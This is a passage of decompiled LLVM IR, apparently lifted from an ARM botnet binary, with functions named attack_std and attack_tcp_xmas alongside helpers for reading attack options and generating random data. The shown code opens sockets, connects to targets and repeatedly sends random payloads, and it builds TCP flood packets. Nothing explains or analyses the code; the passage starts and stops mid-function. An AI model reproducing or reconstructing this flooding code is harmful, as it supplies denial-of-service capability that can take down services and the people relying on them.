  %v4_9568 = mul i32 %v0_954c, 16777216
  %v5_9564 = or i32 %v4_9564, %v4_9568
  %v5_9568 = or i32 %v5_9564, %v5_9554
  %v7_956c = lshr i32 %v0_953c, %v4_9560
  %v8_956c = add i32 %v7_956c, %v5_9568
  store i32 %v8_956c, i32* %r2.global-to-local, align 4
  store i32 %v6_917c, i32* %r1.global-to-local, align 4
  %v5_9588 = call i32 @llvm.bswap.i32(i32 %v8_956c)
  store i32 %v5_9588, i32* %r3.global-to-local, align 4
  store i1 %v7_943c, i1* %cpsr_z.global-to-local, align 1
  %v1_9590 = load i32, i32* @r5, align 4
  %v2_9590 = add i32 %v1_9590, 16
  %v3_9590 = inttoptr i32 %v2_9590 to i32*
  store i32 %v5_9588, i32* %v3_9590, align 4
  br i1 %v2_943c, label %dec_label_pc_9598, label %dec_label_pc_9444

dec_label_pc_9598:                                ; preds = %dec_label_pc_9538, %dec_label_pc_9438
  %v0_9598 = call i32 @rand_next()
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_95a4 = load i32, i32* @fp, align 4
  %v9_95a4 = icmp eq i32 %v0_95a4, 65535
  store i1 %v9_95a4, i1* %cpsr_z.global-to-local, align 1
  %v1_95a8 = load i32, i32* @r5, align 4
  %v2_95a8 = add i32 %v1_95a8, 12
  %v3_95a8 = inttoptr i32 %v2_95a8 to i32*
  store i32 %v0_9598, i32* %v3_95a8, align 4
  br i1 %v9_95a4, label %dec_label_pc_95b0, label %dec_label_pc_9598.dec_label_pc_9454_crit_edge

dec_label_pc_9598.dec_label_pc_9454_crit_edge:    ; preds = %dec_label_pc_9598
  %v1_9458.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9454

dec_label_pc_95b0:                                ; preds = %dec_label_pc_9598, %dec_label_pc_9444
  %v0_95b0 = call i32 @rand_next()
  %v3_95b8 = urem i32 %v0_95b0, 65536
  store i32 %v3_91dc, i32* %r2.global-to-local, align 4
  %v1_95c4 = sub nsw i32 999, %v3_95b8
  store i32 %v1_95c4, i32* %r3.global-to-local, align 4
  %v1_95c8 = load i32, i32* %r4.global-to-local, align 4
  %v9_95c8 = icmp eq i32 %v3_91dc, %v1_95c8
  store i1 %v9_95c8, i1* %cpsr_z.global-to-local, align 1
  %v1_95cc = trunc i32 %v0_95b0 to i16
  %v2_95cc = load i32, i32* @r5, align 4
  %v3_95cc = add i32 %v2_95cc, 4
  %v4_95cc = inttoptr i32 %v3_95cc to i16*
  store i16 %v1_95cc, i16* %v4_95cc, align 2
  %v0_95d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_95d0 = trunc i32 %v0_95d0 to i16
  %v2_95d0 = load i32, i32* @r6, align 4
  %v3_95d0 = add i32 %v2_95d0, 4
  %v4_95d0 = inttoptr i32 %v3_95d0 to i16*
  store i16 %v1_95d0, i16* %v4_95d0, align 2
  br i1 %v9_95c8, label %dec_label_pc_95d8, label %dec_label_pc_95b0.dec_label_pc_9460_crit_edge

dec_label_pc_95b0.dec_label_pc_9460_crit_edge:    ; preds = %dec_label_pc_95b0
  %v1_9464.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9460

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95b0, %dec_label_pc_9454
  %v0_95d8 = call i32 @rand_next()
  %v1_95d8 = trunc i32 %v0_95d8 to i16
  store i32 %v3_91e0, i32* %r3.global-to-local, align 4
  %v1_95e0 = load i32, i32* %r4.global-to-local, align 4
  %v9_95e0 = icmp eq i32 %v3_91e0, %v1_95e0
  store i1 %v9_95e0, i1* %cpsr_z.global-to-local, align 1
  %v3_95e4 = load i32, i32* @r5, align 4
  %v4_95e4 = add i32 %v3_95e4, 44
  %v5_95e4 = inttoptr i32 %v4_95e4 to i16*
  store i16 %v1_95d8, i16* %v5_95e4, align 2
  br i1 %v9_95e0, label %dec_label_pc_95ec, label %dec_label_pc_946c

dec_label_pc_95ec:                                ; preds = %dec_label_pc_95d8, %dec_label_pc_9460
  %v0_95ec = call i32 @rand_next()
  %v1_95ec = trunc i32 %v0_95ec to i16
  store i32 %v1_91d4, i32* @r4, align 4
  store i1 %v2_95f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95f4, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_95ec
  %v3_95fc31 = load i32, i32* @r7, align 4
  %v4_95fc32 = add i32 %v3_95fc31, 2
  %v5_95fc33 = inttoptr i32 %v4_95fc32 to i16*
  store i16 %v1_95ec, i16* %v5_95fc33, align 2
  br label %dec_label_pc_9608

bb85:                                             ; preds = %dec_label_pc_95ec
  %v1_95f8 = load i32, i32* @r5, align 4
  %v2_95f8 = add i32 %v1_95f8, 16
  %v3_95f8 = inttoptr i32 %v2_95f8 to i32*
  %v4_95f8 = load i32, i32* %v3_95f8, align 4
  store i32 %v4_95f8, i32* %r3.global-to-local, align 4
  %v3_95fc = load i32, i32* @r7, align 4
  %v4_95fc = add i32 %v3_95fc, 2
  %v5_95fc = inttoptr i32 %v4_95fc to i16*
  store i16 %v1_95ec, i16* %v5_95fc, align 2
  %v1_9600 = load i32, i32* %r3.global-to-local, align 4
  %v2_9600 = load i32, i32* @r6, align 4
  %v3_9600 = add i32 %v2_9600, 16
  %v4_9600 = inttoptr i32 %v3_9600 to i32*
  store i32 %v1_9600, i32* %v4_9600, align 4
  br label %dec_label_pc_9480

dec_label_pc_9608:                                ; preds = %.thread30, %dec_label_pc_946c
  %v0_9608 = call i32 @rand_next()
  store i32 %v1_9148, i32* %r1.global-to-local, align 4
  store i1 %v2_9610, i1* %cpsr_z.global-to-local, align 1
  %v1_9614 = load i32, i32* @r6, align 4
  %v2_9614 = add i32 %v1_9614, 16
  %v3_9614 = inttoptr i32 %v2_9614 to i32*
  store i32 %v0_9608, i32* %v3_9614, align 4
  br i1 %v2_9610, label %dec_label_pc_948c, label %dec_label_pc_961c

dec_label_pc_961c:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9608
  %v0_961c = load i32, i32* @r7, align 4
  %v1_961c = add i32 %v0_961c, 8
  store i32 %v6_9128, i32* %r1.global-to-local, align 4
  %v2_9624 = inttoptr i32 %v1_961c to i16*
  %v3_9624 = call i32 @rand_str(i16* %v2_9624, i32 %v6_9128)
  br label %dec_label_pc_948c

dec_label_pc_962c:                                ; preds = %dec_label_pc_91a0
  %v1_9630 = call i32 @__GI___libc_close(i32 %v3_9190)
  br label %dec_label_pc_9634

dec_label_pc_9634:                                ; preds = %entry, %dec_label_pc_962c
  %v1_963c = phi i32 [ %v3_9190, %entry ], [ %v1_9630, %dec_label_pc_962c ]
  store i32 %v3_9040, i32* %r4.global-to-local, align 4
  store i32 %v6_9040, i32* %r5.global-to-local, align 4
  store i32 %v24_9040, i32* %fp.global-to-local, align 4
  ret i32 %v1_963c

dec_label_pc_9640:                                ; preds = %dec_label_pc_91c8
  store i32 %v6_9128, i32* %r2.global-to-local, align 4
  %v1_9648 = add i32 %v6_9128, 8
  store i32 %v1_9648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_93fc.preheader

; uselistorder directives
  uselistorder i32 %v1_9648, { 1, 0 }
  uselistorder i16 %v1_95ec, { 1, 0 }
  uselistorder i32 %v0_95b0, { 1, 0 }
  uselistorder i32 %v5_9588, { 1, 0 }
  uselistorder i32 %v0_954c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9528, { 1, 2, 0 }
  uselistorder i32 %v1_9524, { 2, 0, 3, 1 }
  uselistorder i32 %v3_94d8, { 1, 0, 2 }
  uselistorder i32 %v0_94c0, { 1, 0, 2, 3 }
  uselistorder i32 %v7_9424, { 1, 0, 2 }
  uselistorder i1 %v7_943c, { 2, 1, 0 }
  uselistorder i1 %v2_9610, { 2, 3, 1, 0 }
  uselistorder i1 %v2_95f4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9398, { 1, 0 }
  uselistorder i32 %v4_930c13, { 1, 0 }
  uselistorder i32 %v3_9230, { 1, 0 }
  uselistorder i32 %v3_9214, { 1, 2, 0 }
  uselistorder i32 %v1_9210, { 1, 0 }
  uselistorder i32 %v1_91d4, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_91d0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_91cc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_91c8, { 1, 0, 2, 3 }
  uselistorder i1 %v7_91c0, { 1, 0 }
  uselistorder i1 %v7_9194, { 1, 0 }
  uselistorder i32 %v3_9190, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v6_917c, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9148, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_9128, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_90dc, { 1, 2, 0 }
  uselistorder i32 %v1_90b8, { 3, 2, 1, 0 }
  uselistorder i32 %v6_90b0, { 1, 0 }
  uselistorder i32 %v6_9074, { 2, 1, 3, 0 }
  uselistorder i32 %v2_905c, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 30, 31, 33, 32, 35, 34, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9634, { 1, 0 }
  uselistorder label %dec_label_pc_961c, { 1, 0 }
  uselistorder label %dec_label_pc_948c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_93fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93fc.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @attack_std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_965c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_9678 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_9678, i32* @sl, align 4
  %v0_9684 = load i32, i32* @r7, align 4
  %v2_9688 = call i32 @calloc(i32 %v0_9684, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_9694 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_9688, i32* @r8, align 4
  %v0_96a4 = load i32, i32* @r5, align 4
  %v5_96a8 = inttoptr i32 %v0_9694 to i32*
  %v6_96a8 = call i32 @attack_get_opt_int(i32 %v0_96a4, i32* %v5_96a8, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v3_96b0 = urem i32 %v6_96a8, 65536
  %v0_96b4 = load i32, i32* @r6, align 4
  %v0_96bc = load i32, i32* @r4, align 4
  store i32 %v0_96bc, i32* %r3.global-to-local, align 4
  %v0_96c0 = load i32, i32* @r5, align 4
  %v5_96c8 = inttoptr i32 %v0_96b4 to i32*
  %v6_96c8 = call i32 @attack_get_opt_int(i32 %v0_96c0, i32* %v5_96c8, i32 6, i32 %v0_96bc, i32 %v3_96b0)
  %v0_96cc = load i32, i32* @r6, align 4
  %v3_96d0 = mul i32 %v6_96c8, 65536
  store i32 %v3_96d0, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_96dc = load i32, i32* @r5, align 4
  %v5_96e0 = inttoptr i32 %v0_96cc to i32*
  %v6_96e0 = call i32 @attack_get_opt_int(i32 %v0_96dc, i32* %v5_96e0, i32 0, i32 1024, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_96f0 = load i32, i32* @r6, align 4
  %v0_96f4 = load i32, i32* @r5, align 4
  %v3_96f8 = urem i32 %v6_96e0, 65536
  store i32 %v3_96f8, i32* @r5, align 4
  %v5_96fc = inttoptr i32 %v0_96f0 to i32*
  %v6_96fc = call i32 @attack_get_opt_int(i32 %v0_96f4, i32* %v5_96fc, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_9700 = load i32, i32* %sb.global-to-local, align 4
  %v3_9700 = udiv i32 %v0_9700, 65536
  store i32 %v3_9700, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_9708 = load i32, i32* @r4, align 4
  %v9_9708 = icmp eq i32 %v3_9700, %v1_9708
  br i1 %v9_9708, label %dec_label_pc_9738, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_9720 = udiv i32 %v0_9700, 16777216
  store i32 %v4_9720, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9748

dec_label_pc_9738:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_9738 = call i32 @rand_next()
  br label %dec_label_pc_9748

dec_label_pc_9748:                                ; preds = %bb, %dec_label_pc_9738
  %v0_972c10 = urem i32 %v6_96fc, 256
  %v0_9748 = load i32, i32* @r7, align 4
  %v2_9748 = icmp eq i32 %v0_9748, 0
  br i1 %v2_9748, label %dec_label_pc_9888, label %dec_label_pc_9750

dec_label_pc_9750:                                ; preds = %dec_label_pc_9748
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_97fc = udiv i32 %v3_96b0, 256
  %v1_97f8 = mul i32 %v6_96a8, 256
  %v4_9800 = and i32 %v1_97f8, 65280
  %v5_9800 = or i32 %v4_9800, %v3_97fc
  %v2_9780 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_97e0

dec_label_pc_9760:                                ; preds = %bb51, %dec_label_pc_9820
  %v3_976c = call i32 @socket(i32 2, i32 2, i32 0)
  %v7_9774 = icmp eq i32 %v3_976c, -1
  %v0_9778 = load i32, i32* @sb, align 4
  %v1_9778 = add i32 %v0_9778, 1
  store i32 %v1_9778, i32* @sb, align 4
  %v0_977c = load i32, i32* @fp, align 4
  %v1_977c = add i32 %v0_977c, 24
  store i32 %v1_977c, i32* @fp, align 4
  %v2_9788 = load i32, i32* @r8, align 4
  %v3_9788 = add i32 %v2_9788, %stack_var_-60.0
  %v4_9788 = inttoptr i32 %v3_9788 to i32*
  store i32 %v3_976c, i32* %v4_9788, align 4
  br i1 %v7_9774, label %dec_label_pc_987c, label %dec_label_pc_9790

dec_label_pc_9790:                                ; preds = %dec_label_pc_9760
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_97a8 = call i32 @bind(i32 %v3_976c, i32 %v2_9780, i32 16)
  %v0_97ac = load i32, i32* @r6, align 4
  %v1_97ac = add i32 %v0_97ac, 20
  %v2_97ac = inttoptr i32 %v1_97ac to i8*
  %v3_97ac = load i8, i8* %v2_97ac, align 1
  %v4_97ac = zext i8 %v3_97ac to i32
  store i32 %v4_97ac, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_97ac, 32
  br i1 %tmp, label %dec_label_pc_9834, label %dec_label_pc_97b8

dec_label_pc_97b8:                                ; preds = %dec_label_pc_9790, %dec_label_pc_9834
  %v0_97bc = phi i32 [ %v0_97ac, %dec_label_pc_9790 ], [ %v0_97bc.pre, %dec_label_pc_9834 ]
  %v1_97c0 = load i32, i32* @r8, align 4
  %v2_97c0 = add i32 %v1_97c0, %stack_var_-60.0
  %v3_97c0 = inttoptr i32 %v2_97c0 to i32*
  %v4_97c0 = load i32, i32* %v3_97c0, align 4
  %v3_97c8 = call i32 @__libc_connect(i32 %v4_97c0, i32 %v0_97bc, i32 16)
  %v0_97d0 = load i32, i32* @sb, align 4
  %v1_97d0 = load i32, i32* @r7, align 4
  %v9_97d0 = icmp eq i32 %v0_97d0, %v1_97d0
  %v1_97d4 = add i32 %stack_var_-60.0, 4
  store i32 %v1_97d4, i32* %r3.global-to-local, align 4
  br i1 %v9_97d0, label %dec_label_pc_9888, label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_9750
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_9750 ], [ %v1_97d4, %dec_label_pc_97b8 ]
  store i32 65535, i32* @r4, align 4
  %v2_97f0 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_9800, i32* %r3.global-to-local, align 4
  %v1_980c = load i32, i32* @r4, align 4
  %v9_980c = icmp eq i32 %v3_96b0, %v1_980c
  %v1_9810 = load i32, i32* @fp, align 4
  %v2_9810 = add i32 %v1_9810, %arg2
  store i32 %v2_9810, i32* @r6, align 4
  %v2_9814 = load i32, i32* @sl, align 4
  %v3_9814 = add i32 %v2_9814, %stack_var_-60.0
  %v4_9814 = inttoptr i32 %v3_9814 to i32*
  store i32 %v2_97f0, i32* %v4_9814, align 4
  br i1 %v9_980c, label %dec_label_pc_9820, label %bb51

bb51:                                             ; preds = %dec_label_pc_97e0
  %v1_9818 = load i32, i32* %r3.global-to-local, align 4
  %v2_9818 = trunc i32 %v1_9818 to i16
  %v3_9818 = load i32, i32* @r6, align 4
  %v4_9818 = add i32 %v3_9818, 2
  %v5_9818 = inttoptr i32 %v4_9818 to i16*
  store i16 %v2_9818, i16* %v5_9818, align 2
  br label %dec_label_pc_9760

dec_label_pc_9820:                                ; preds = %dec_label_pc_97e0
  %v0_9820 = call i32 @rand_next()
  %v1_9820 = trunc i32 %v0_9820 to i16
  %v0_9828 = load i32, i32* @fp, align 4
  %v2_9828 = add i32 %v0_9828, %arg2
  store i32 %v2_9828, i32* @r6, align 4
  %v4_982c = add i32 %v2_9828, 2
  %v5_982c = inttoptr i32 %v4_982c to i16*
  store i16 %v1_9820, i16* %v5_982c, align 2
  br label %dec_label_pc_9760

dec_label_pc_9834:                                ; preds = %dec_label_pc_9790
  %v1_9834 = add i32 %v0_97ac, 16
  %v2_9834 = inttoptr i32 %v1_9834 to i32*
  %v3_9834 = load i32, i32* %v2_9834, align 4
  store i32 %v3_9834, i32* @r4, align 4
  %v0_9838 = call i32 @rand_next()
  %v0_983c = load i32, i32* @r4, align 4
  %v1_983c = and i32 %v0_983c, 16711680
  %v3_9840 = udiv i32 %v0_983c, 16777216
  %v4_9844 = udiv i32 %v1_983c, 256
  %v5_9844 = or i32 %v4_9844, %v3_9840
  %v1_9848 = and i32 %v0_983c, ptrtoint (i32* @global_var_ff00.33 to i32)
  store i32 %v1_9848, i32* %r3.global-to-local, align 4
  %v4_984c = mul i32 %v1_9848, 256
  %v5_984c = or i32 %v5_9844, %v4_984c
  %v0_9850 = load i32, i32* @r6, align 4
  %v1_9850 = add i32 %v0_9850, 20
  %v2_9850 = inttoptr i32 %v1_9850 to i8*
  %v3_9850 = load i8, i8* %v2_9850, align 1
  %v4_9850 = zext i8 %v3_9850 to i32
  %v4_9854 = mul i32 %v0_983c, 16777216
  %v5_9854 = or i32 %v5_984c, %v4_9854
  %v7_9858 = lshr i32 %v0_9838, %v4_9850
  %v8_9858 = add i32 %v7_9858, %v5_9854
  %v5_9870 = call i32 @llvm.bswap.i32(i32 %v8_9858)
  store i32 %v5_9870, i32* %r3.global-to-local, align 4
  %v2_9874 = add i32 %v0_9850, 4
  %v3_9874 = inttoptr i32 %v2_9874 to i32*
  store i32 %v5_9870, i32* %v3_9874, align 4
  %v0_97bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_97b8

dec_label_pc_987c:                                ; preds = %dec_label_pc_9760
  store i32 %v18_965c, i32* %sb.global-to-local, align 4
  ret i32 %v3_976c

dec_label_pc_9888:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_9748
  %v1_98c822 = phi i32 [ 0, %dec_label_pc_9748 ], [ %v0_97d0, %dec_label_pc_97b8 ]
  %v2_988c = icmp eq i32 %v0_972c10, 0
  br i1 %v2_988c, label %dec_label_pc_98ac.outer, label %dec_label_pc_98c4

dec_label_pc_989c:                                ; preds = %dec_label_pc_98ac
  store i32 %v1_98a0, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_989c = load i32, i32* @r8, align 4
  %v4_989c = mul i32 %v1_98a0, 4
  %v5_989c = add i32 %v0_989c, %v4_989c
  %v6_989c = inttoptr i32 %v5_989c to i32*
  %v7_989c = load i32, i32* %v6_989c, align 4
  %v0_98a0 = load i32, i32* @sl, align 4
  %v5_98a0 = add i32 %v0_98a0, %v4_989c
  %v6_98a0 = inttoptr i32 %v5_98a0 to i32*
  %v7_98a0 = load i32, i32* %v6_98a0, align 4
  %v4_98a4 = call i32 @__libc_send(i32 %v7_989c, i32 %v7_98a0, i32 %v0_98b0, i32 16384)
  %v0_98a8 = load i32, i32* @r4, align 4
  %v1_98a8 = add i32 %v0_98a8, 1
  %v0_98ac.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_98ac.outer

dec_label_pc_98ac.outer:                          ; preds = %dec_label_pc_9888, %dec_label_pc_989c
  %v0_98ac.ph = phi i32 [ %v0_98ac.pre.pre, %dec_label_pc_989c ], [ %v1_98c822, %dec_label_pc_9888 ]
  %v1_98a0.ph = phi i32 [ %v1_98a8, %dec_label_pc_989c ], [ 0, %dec_label_pc_9888 ]
  %v0_98b0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_98ac

dec_label_pc_98ac:                                ; preds = %dec_label_pc_98ac.outer, %dec_label_pc_98ac
  %v1_98a0 = phi i32 [ 0, %dec_label_pc_98ac ], [ %v1_98a0.ph, %dec_label_pc_98ac.outer ]
  %v8_98b8 = icmp sgt i32 %v0_98ac.ph, %v1_98a0
  br i1 %v8_98b8, label %dec_label_pc_989c, label %dec_label_pc_98ac

dec_label_pc_98c4:                                ; preds = %dec_label_pc_98c8, %dec_label_pc_9888
  %v1_98c821 = phi i32 [ %v1_98c822, %dec_label_pc_9888 ], [ %v1_98c8, %dec_label_pc_98c8 ]
  br label %dec_label_pc_98c8

dec_label_pc_98c8:                                ; preds = %dec_label_pc_98d4, %dec_label_pc_98c4
  %v1_98c8 = phi i32 [ %v1_98c821, %dec_label_pc_98c4 ], [ %v1_98c8.pre, %dec_label_pc_98d4 ]
  %v1_98d4 = phi i32 [ 0, %dec_label_pc_98c4 ], [ %v1_98f4, %dec_label_pc_98d4 ]
  store i32 %v1_98d4, i32* @r6, align 4
  %v6_98d0 = icmp slt i32 %v1_98d4, %v1_98c8
  br i1 %v6_98d0, label %dec_label_pc_98d4, label %dec_label_pc_98c4

dec_label_pc_98d4:                                ; preds = %dec_label_pc_98c8
  %v0_98cc = load i32, i32* @r5, align 4
  %v0_98d4 = load i32, i32* @sl, align 4
  %v4_98d4 = mul i32 %v1_98d4, 4
  %v5_98d4 = add i32 %v0_98d4, %v4_98d4
  %v6_98d4 = inttoptr i32 %v5_98d4 to i32*
  %v7_98d4 = load i32, i32* %v6_98d4, align 4
  store i32 %v7_98d4, i32* @r4, align 4
  %v2_98dc = inttoptr i32 %v7_98d4 to i16*
  %v3_98dc = call i32 @rand_str(i16* %v2_98dc, i32 %v0_98cc)
  %v0_98e0 = load i32, i32* @r8, align 4
  %v1_98e0 = load i32, i32* @r6, align 4
  %v4_98e0 = mul i32 %v1_98e0, 4
  %v5_98e0 = add i32 %v4_98e0, %v0_98e0
  %v6_98e0 = inttoptr i32 %v5_98e0 to i32*
  %v7_98e0 = load i32, i32* %v6_98e0, align 4
  %v0_98e4 = load i32, i32* @r4, align 4
  %v0_98e8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_98f0 = call i32 @__libc_send(i32 %v7_98e0, i32 %v0_98e4, i32 %v0_98e8, i32 16384)
  %v0_98f4 = load i32, i32* @r6, align 4
  %v1_98f4 = add i32 %v0_98f4, 1
  %v1_98c8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_98c8

; uselistorder directives
  uselistorder i32 %v1_98c8, { 1, 0 }
  uselistorder i32 %v1_98a0, { 2, 1, 0 }
  uselistorder i32 %v5_9870, { 1, 0 }
  uselistorder i32 %v0_983c, { 0, 2, 1, 3 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_97ac, { 1, 0, 2 }
  uselistorder i32 %v3_976c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_9700, { 1, 0 }
  uselistorder i32 %v3_96b0, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_98ac, { 1, 0 }
  uselistorder label %dec_label_pc_98ac.outer, { 1, 0 }
  uselistorder label %dec_label_pc_97b8, { 1, 0 }
  uselistorder label %dec_label_pc_9760, { 1, 0 }
  uselistorder label %dec_label_pc_9748, { 1, 0 }
}

define i32 @attack_tcp_xmas(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_98fc = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_9918 = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_9924 = load i32, i32* @r6, align 4
  store i32 %v0_9924, i32* %r0.global-to-local, align 4
  %v2_9928 = call i32 @calloc(i32 %v0_9924, i32 4)
  %v0_992c = load i32, i32* @r5, align 4
  store i32 %v0_992c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_993c = load i32, i32* @r4, align 4
  store i32 %v0_993c, i32* %r0.global-to-local, align 4
  %v5_9940 = inttoptr i32 %v0_992c to i32*
  %v6_9940 = call i32 @attack_get_opt_int(i32 %v0_993c, i32* %v5_9940, i32 2, i32 0, i32 %v2_9928)
  %v1_994c = urem i32 %v6_9940, 256
  store i32 %v1_994c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9958 = load i32, i32* @r5, align 4
  store i32 %v0_9958, i32* %r1.global-to-local, align 4
  %v0_995c = load i32, i32* @r4, align 4
  store i32 %v0_995c, i32* %r0.global-to-local, align 4
  %v5_9960 = trunc i32 %v6_9940 to i8
  %v6_9964 = inttoptr i32 %v0_9958 to i32*
  %v7_9964 = call i32 @attack_get_opt_int(i32 %v0_995c, i32* %v6_9964, i32 3, i32 65535, i32 %v6_9940)
  %v0_9968 = load i32, i32* @r5, align 4
  store i32 %v0_9968, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9964, i32* @r7, align 4
  %v0_9978 = load i32, i32* @r4, align 4
  store i32 %v0_9978, i32* %r0.global-to-local, align 4
  %v5_997c = inttoptr i32 %v0_9968 to i32*
  %v6_997c = call i32 @attack_get_opt_int(i32 %v0_9978, i32* %v5_997c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_9984 = urem i32 %v6_997c, 256
  store i32 %v1_9984, i32* %ip.global-to-local, align 4
  %v0_9988 = load i32, i32* @r5, align 4
  store i32 %v0_9988, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
